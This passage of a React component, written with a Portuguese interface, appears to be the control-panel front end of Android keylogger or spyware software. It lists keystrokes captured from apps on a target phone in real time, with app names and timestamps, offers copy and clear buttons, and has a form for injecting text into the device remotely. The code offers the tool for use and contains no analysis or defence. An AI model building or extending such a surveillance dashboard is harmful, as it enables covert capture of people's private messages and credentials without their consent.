              <Search size={12} style={{ position: "absolute", left: "8px", top: "50%", transform: "translateY(-50%)", color: "#64748b" }} />
              <input
                type="text"
                placeholder="Filtrar digitação..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  width: "100%",
                  background: "#0d111c",
                  border: "1px solid #1e293b",
                  borderRadius: "5px",
                  padding: "4px 8px 4px 26px",
                  fontSize: "10.5px",
                  color: "#cbd5e1",
                  outline: "none"
                }}
              />
            </div>
            <button
              type="button"
              onClick={fetchLogs}
              title="Atualizar Logs"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#94a3b8", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <RefreshCw size={12} className={isRefreshing ? "animate-spin" : ""} />
            </button>
            <button
              type="button"
              onClick={handleCopyAll}
              title="Copiar todos os registros visíveis"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#94a3b8", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <Copy size={12} />
            </button>
            <button
              type="button"
              onClick={handleClearLogs}
              title="Limpar histórico"
              style={{ background: "#0d111c", border: "1px solid #1e293b", color: "#ef4444", borderRadius: "5px", padding: "4px 6px", cursor: "pointer" }}
            >
              <Trash2 size={12} />
            </button>
          </div>

          {/* Log Stream Body */}
          <div style={{ flex: 1, overflowY: "auto", padding: "8px 10px", display: "flex", flexDirection: "column", gap: "6px" }}>
            {filteredLogs.length === 0 ? (
              <div style={{ margin: "auto", textAlign: "center", color: "#64748b", padding: "24px 10px" }}>
                <Keyboard size={24} style={{ opacity: 0.4, marginBottom: "8px" }} />
                <div style={{ fontSize: "11px", fontWeight: 700 }}>Nenhuma digitação registrada nesta categoria.</div>
                <div style={{ fontSize: "10px", marginTop: "4px" }}>As teclas digitadas nos aplicativos aparecem aqui em tempo real.</div>
              </div>
            ) : (
              filteredLogs.map((item) => (
                <div
                  key={item.id}
                  style={{
                    background: "#0c0f18",
                    border: "1px solid #1a2233",
                    borderRadius: "6px",
                    padding: "8px 10px",
                    display: "flex",
                    flexDirection: "column",
                    gap: "4px",
                    transition: "border-color 0.15s ease"
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                      <AppLogo name={item.appName} packageName={item.packageName} size={14} />
                      <span style={{ fontSize: "10.5px", fontWeight: 700, color: "#f8fafc" }}>
                        {item.appName}
                      </span>
                      {item.contextTag && (
                        <span style={{ fontSize: "9px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", padding: "1px 4px", borderRadius: "3px" }}>
                          {item.contextTag}
                        </span>
                      )}
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                      <span style={{ fontSize: "9.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
                        {item.timestamp}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleCopy(item.content, item.id)}
                        title="Copiar texto"
                        style={{
                          background: "transparent",
                          border: "none",
                          color: copiedId === item.id ? "#22c55e" : "#64748b",
                          cursor: "pointer",
                          padding: "1px 3px"
                        }}
                      >
                        {copiedId === item.id ? <Check size={11} /> : <Copy size={11} />}
                      </button>
                    </div>
                  </div>

                  <div
                    style={{
                      fontSize: "11.5px",
                      color: "#cbd5e1",
                      background: "#070910",
                      padding: "6px 8px",
                      borderRadius: "4px",
                      border: "1px solid #141a29",
                      fontFamily: "var(--font-mono)",
                      wordBreak: "break-word"
                    }}
                  >
                    {item.content}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* Quick Direct Keystroke Sender at Footer */}
          <form
            onSubmit={handleSendText}
            style={{
              padding: "8px 10px",
              background: "#080a12",
              borderTop: "1px solid #1a2233",
              display: "flex",
              gap: "6px"
            }}
          >
            <input
              type="text"
              placeholder="Digitar texto no aparelho..."
              value={quickInput}
              onChange={(e) => setQuickInput(e.target.value)}
              style={{
                flex: 1,
                background: "#0d111c",
                border: "1px solid #1e293b",
                borderRadius: "5px",
                padding: "6px 10px",
                fontSize: "11px",
                color: "#cbd5e1",
                outline: "none"
              }}
            />
            <button
              type="submit"
              disabled={isSending || !quickInput.trim()}
              style={{
                background: "var(--crimson-neon, #ff1a2a)",
                border: "none",
                borderRadius: "5px",
                color: "#fff",
                padding: "6px 10px",
                cursor: quickInput.trim() ? "pointer" : "default",
                opacity: quickInput.trim() ? 1 : 0.5,
                display: "flex",
                alignItems: "center",
                justifyContent: "center"
              }}
              title="Injetar texto no celular"
            >
              <Send size={13} />
            </button>
          </form>
        </div>
      )}
    </div>
    );
};
